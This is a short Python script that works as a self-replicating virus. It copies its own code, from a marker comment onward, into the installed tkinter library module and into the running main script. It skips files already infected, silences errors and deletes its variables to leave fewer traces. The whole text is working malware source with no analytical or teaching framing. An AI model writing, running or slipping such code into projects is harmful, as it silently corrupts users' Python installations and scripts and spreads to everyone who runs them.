mark="#####MyPython####"#v1.0.0
code=''
with open(__file__,encoding="utf-8") as f:
	for line in f:
		if mark in line.strip():
			code=line+f.read()

def spread(mod):
	file=__import__(mod).__file__
	with open(file,'r',encoding='utf-8') as f:
		for line in f:
			if mark in line:return
	with open(file,'a',encoding='utf-8') as f:
		f.write(code)

try:spread('tkinter');spread('__main__')
except:pass
del spread,code,mark,f,line